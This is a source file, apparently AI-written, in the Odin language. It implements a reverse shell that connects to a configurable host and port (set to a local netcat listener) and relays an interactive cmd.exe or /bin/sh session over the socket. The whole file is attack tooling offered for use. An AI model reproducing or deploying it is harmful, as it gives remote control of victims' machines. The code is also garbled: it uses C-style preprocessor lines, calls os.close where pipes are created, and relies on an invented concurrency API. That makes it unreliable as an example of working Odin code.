package main

import "core:fmt"
import "core:net"
import "core:process"
import "core:mem"
import "core:time"
import "core:os"

// NOTE: IMPORTANT FOR LOCAL TESTING - USE LOCALHOST
const TARGET_HOSTNAME :: "127.0.0.1"; // Your local machine's IP address
const TARGET_PORT     :: 1337;       // Must match netcat's listening port

main :: proc() {
    context.allocator = mem.heap_allocator();

    endpoint := net.Endpoint{
        address = net.aton(TARGET_HOSTNAME),
        port    = u16(TARGET_PORT),
    };
    if endpoint.address.family == .Invalid {
        fmt.eprintln("Failed to resolve hostname:", TARGET_HOSTNAME);
        os.exit(1);
    }

    socket, conn_err := net.dial_tcp(endpoint);
    if conn_err != nil {
        fmt.eprintln("Failed to connect:", conn_err);
        os.exit(1);
    }
    defer net.close(socket);
    fmt.println("Successfully connected to", TARGET_HOSTNAME, ":", TARGET_PORT); // Added for feedback

    child_process_args := [dynamic]string{};
    #ifdef ODIN_OS_WINDOWS
        append(&child_process_args, "cmd.exe");
    #else
        append(&child_process_args, "/bin/sh");
        append(&child_process_args, "-i");
    #endif

    // Create pipes for stdin, stdout, stderr
    // NOTE: For simplicity and brevity, I'm using os.pipe directly.
    // In a more robust Odin program, you might wrap these in specific handles.
    stdin_reader, stdin_writer, _ := os.pipe(); defer os.close(stdin_reader);
    stdout_reader, stdout_writer, _ := os.close(stdout_writer); // Defer closing the writer side of stdout
    stderr_reader, stderr_writer, _ := os.close(stderr_writer); // Defer closing the writer side of stderr

    proc_options := process.Options{
        command = child_process_args,
        stdin   = stdin_reader,
        stdout  = stdout_writer,
        stderr  = stderr_writer,
    };

    proc_handle, spawn_err := process.spawn(proc_options);
    if spawn_err != nil {
        fmt.eprintln("Failed to spawn process:", spawn_err);
        os.exit(1);
    }
    defer process.kill(proc_handle) or_else {};

    buffer: [4096]u8;

    // Concurrently handle input from socket to shell and output from shell to socket
    // This is similar to Go's goroutines, using separate procedures.

    // Socket to Shell (stdin)
    go_defer_group: time.go_defer_group;
    time.add_to_go_defer_group(&go_defer_group, proc() {
        for {
            bytes_read, read_err := net.recv(socket, buffer[:]);
            if read_err != nil || bytes_read == 0 {
                break;
            }
            _, write_err := os.write(stdin_writer, buffer[:bytes_read]);
            if write_err != nil {
                break;
            }
        }
        os.close(stdin_writer); // Close stdin_writer when done with socket input
    });

    // Shell stdout to Socket
    time.add_to_go_defer_group(&go_defer_group, proc() {
        for {
            output_len, output_read_err := os.read(stdout_reader, buffer[:]);
            if output_read_err == nil && output_len > 0 {
                _, write_socket_err := net.send(socket, buffer[:output_len]);
                if write_socket_err != nil {
                    break;
                }
            } else if output_read_err != nil && output_read_err != os.ERROR_PIPE_BROKEN {
                // Handle actual errors, but ignore pipe broken as it means shell exited
                break;
            }
            time.sleep(1 * time.MS); // Small sleep to prevent busy-waiting
        }
        os.close(stdout_reader); // Close stdout_reader when done
    });

    // Shell stderr to Socket
    time.add_to_go_defer_group(&go_defer_group, proc() {
        for {
            error_len, error_read_err := os.read(stderr_reader, buffer[:]);
            if error_read_err == nil && error_len > 0 {
                _, write_socket_err := net.send(socket, buffer[:error_len]);
                if write_socket_err != nil {
                    break;
                }
            } else if error_read_err != nil && error_read_err != os.ERROR_PIPE_BROKEN {
                break;
            }
            time.sleep(1 * time.MS); // Small sleep
        }
        os.close(stderr_reader); // Close stderr_reader when done
    });

    // Wait for the process to exit
    process.wait(proc_handle);
    fmt.println("Process exited.");

    // Clean up go_defer_group goroutines
    time.wait_for_go_defer_group(go_defer_group);
    fmt.println("Reverse shell connection closed.");
}
